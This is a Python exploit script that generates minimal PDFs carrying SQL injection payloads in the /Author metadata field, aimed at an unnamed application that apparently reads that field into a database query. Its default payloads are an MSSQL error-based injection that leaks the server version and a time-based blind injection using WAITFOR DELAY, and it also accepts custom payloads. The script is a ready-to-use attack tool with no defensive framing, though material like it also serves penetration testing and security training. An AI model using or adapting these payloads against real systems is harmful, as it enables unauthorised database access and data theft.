#!/usr/bin/env python3
"""
Generate minimal PDFs with ONLY /Author set (no Producer/date/XMP).
A single /Info object -> the app is forced to read your payload.

Run with no arguments to write the two default payload PDFs, or pass a custom
payload with -o to build your own:

    python3 gen_pdf.py                          # writes the default samples
    python3 gen_pdf.py "x'" -o quote.pdf        # custom /Author value
"""

import argparse


def build_pdf(author: bytes) -> bytes:
    # /Info with ONLY /Author.
    esc = author.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    info = b"<< /Author (" + esc + b") >>"

    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
        info,
    ]

    pdf = b"%PDF-1.4\n"
    offsets = []
    for i, obj in enumerate(objects, start=1):
        offsets.append(len(pdf))
        pdf += f"{i} 0 obj\n".encode() + obj + b"\nendobj\n"

    xref_pos = len(pdf)
    n = len(objects) + 1
    pdf += b"xref\n0 " + str(n).encode() + b"\n0000000000 65535 f \n"
    for off in offsets:
        pdf += ("%010d 00000 n \n" % off).encode()
    pdf += (b"trailer\n<< /Size " + str(n).encode() +
            b" /Root 1 0 R /Info 4 0 R >>\nstartxref\n" +
            str(xref_pos).encode() + b"\n%%EOF")
    return pdf


DEFAULT_PAYLOADS = {
    # error-based
    "exploit-sql-error-based.pdf": b"x'); SELECT CAST(@@version AS INT);--",
    # time-based blind
    "exploit-sql-blind.pdf":       b"x'); WAITFOR DELAY '0:0:12'--",
}


def main():
    ap = argparse.ArgumentParser(description="Build a PDF with a controlled /Author value.")
    ap.add_argument("payload", nargs="?", help="value to put in the /Author field")
    ap.add_argument("-o", "--out", help="output file (required when payload is given)")
    args = ap.parse_args()

    if args.payload is not None:
        out = args.out or "out.pdf"
        with open(out, "wb") as f:
            f.write(build_pdf(args.payload.encode("latin-1", errors="replace")))
        print(f"[+] {out}  ->  /Author ({args.payload})")
        return

    
    for name, p in DEFAULT_PAYLOADS.items():
        with open(name, "wb") as f:
            f.write(build_pdf(p))
        print(f"[+] {name}  ->  /Author ({p.decode()})")


if __name__ == "__main__":
    main()
